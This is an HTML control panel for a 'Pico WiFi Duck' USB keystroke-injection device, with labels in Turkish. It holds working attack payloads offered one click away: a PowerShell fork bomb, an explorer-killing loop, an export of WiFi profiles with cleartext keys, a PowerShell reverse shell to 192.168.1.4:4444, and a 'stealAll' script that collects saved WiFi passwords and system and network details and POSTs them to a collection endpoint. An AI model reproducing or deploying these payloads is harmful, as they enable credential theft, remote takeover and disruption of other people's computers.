<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pico WiFi Duck</title>
    <style>
        body{font-family:Arial;background:#36393e;margin:0;padding:20px;color:#fff}
        .container{display:flex;gap:20px;max-width:900px;margin:0 auto}
        .panel{background:#2f3136;padding:20px;border-radius:8px;flex:1}
        h2{color:#fff;font-size:1.2rem;margin:0 0 15px 0}
        textarea{width:100%;height:250px;padding:10px;background:#1a1a1a;color:#0f0;border:none;border-radius:4px;font-family:monospace;box-sizing:border-box;resize:vertical}
        button{background:#ffc107;color:#000;padding:12px;margin:5px 0;border:none;border-radius:4px;cursor:pointer;font-size:14px;width:100%;font-weight:bold}
        button:hover{opacity:0.9}
        .blue{background:#2196F3;color:#fff}
        .green{background:#4CAF50;color:#fff}
        .red{background:#f44336;color:#fff}
        .purple{background:#9c27b0;color:#fff}
        .status{background:#1a1a1a;padding:10px;border-radius:4px;margin:10px 0;font-size:12px}
        .btn-group{display:flex;gap:5px;flex-wrap:wrap}
        .btn-group button{flex:1;min-width:70px;font-size:12px;padding:8px}
    </style>
</head>
<body>
    <div class="container">
        <div class="panel">
            <h2>🦆 Ducky Script</h2>
            <div class="btn-group">
                <button onclick="loadScript('f-bomb')">💣</button>
                <button onclick="loadScript('explorer')">💥</button>
                <button onclick="loadScript('wifi')">🔑</button>
                <button onclick="loadScript('reverse')">🐚</button>
            </div>
            <textarea id="payload" placeholder="Script yazın..."></textarea>
            <button onclick="runPayload()">▶ RUN</button>
        </div>
        
        <div class="panel">
            <h2>🎮 Jiggler</h2>
            <button class="blue" onclick="send('/jiggle/mouse')">🖱️ Mouse</button>
            <button class="blue" onclick="send('/jiggle/combined')">🖱️⌨️ Mouse+Klavye</button>
            <button class="red" onclick="send('/jiggle/stop')">⏹️ DURDUR</button>
            
            <h2 style="margin-top:20px">📊 Bilgi Topla</h2>
            <button class="purple" onclick="stealAll()">🔍 Tüm Bilgileri Topla</button>
            <button class="green" onclick="location.href='/view'">👁️ Görüntüle</button>
            
            <div class="status" id="status">
                ⚡ Hazır<br>
                <small>GP5→GND:Mouse | GP6→GND:Mouse+Klavye</small>
            </div>
        </div>
    </div>

    <script>
        async function send(url, data=null) {
            try {
                let r = await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: data ? JSON.stringify(data) : null
                });
                document.getElementById('status').innerHTML = r.ok ? '✅ Başarılı' : '❌ Hata';
            } catch(e) {
                document.getElementById('status').innerHTML = '❌ Bağlantı hatası';
            }
        }
        
        function runPayload() {
            let payload = document.getElementById('payload').value;
            send('/api', {content: payload});
        }
        
       function stealAll() {
    let cmd = "$w=@();netsh wlan show profiles|sls ':'|%{$w+=$_.ToString().Split(':')[1].Trim()};$s=@{type='all';wifi=@();pc=$env:COMPUTERNAME;user=$env:USERNAME;os=(gwmi win32_operatingsystem).caption;tarih=(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')};foreach($n in $w){$p=netsh wlan show profile name=$n key=clear|sls 'Key Content';if($p){$pw=$p.ToString().Replace('Key Content            : ','')}else{$pw='(Acik)'};$s.wifi+=@{ssid=$n;pwd=$pw}};$s.cpu=(gwmi win32_processor).Name;$s.ram=[math]::Round((gwmi win32_computersystem).TotalPhysicalMemory/1GB);$s.gpu=(gwmi win32_videocontroller).Name;$ip=gwmi Win32_NetworkAdapterConfiguration|?{$_.IPAddress -ne $null -and $_.DefaultIPGateway -ne $null};$s.ip=$ip.IPAddress[0];$s.mac=$ip.MACAddress;$s.uptime=(gwmi win32_operatingsystem).LastBootUpTime;$j=$s|ConvertTo-Json -Compress;irm 192.168.4.1/collect -Method POST -Body $j";
    
    let script = "DELAY 500\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING " + cmd + "\nENTER\nDELAY 3000\nSTRING exit\nENTER";
    
    document.getElementById('payload').value = script;
    send('/api', {content: script});
}
        
        function loadScript(t) {
            let s = {
                'f-bomb': 'DELAY 300\nGUI r\nDELAY 100\nSTRING powershell while(1){ii **}\nENTER',
                'explorer': 'DELAY 500\nGUI r\nDELAY 500\nSTRING powershell while($true){Stop-Process -Name explorer -Force}\nENTER',
                'wifi': 'DELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nSTRING cd %userprofile%\\Desktop & netsh wlan export profile key=clear\nENTER',
                'reverse': 'DELAY 500\nGUI r\nDELAY 500\nSTRING powershell -c "$c=New-Object Net.Sockets.TCPClient(\'192.168.1.4\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);$s.Write($sb,0,$sb.Length)}"\nENTER'
            };
            document.getElementById('payload').value = s[t] || '';
        }
    </script>
</body>
</html>
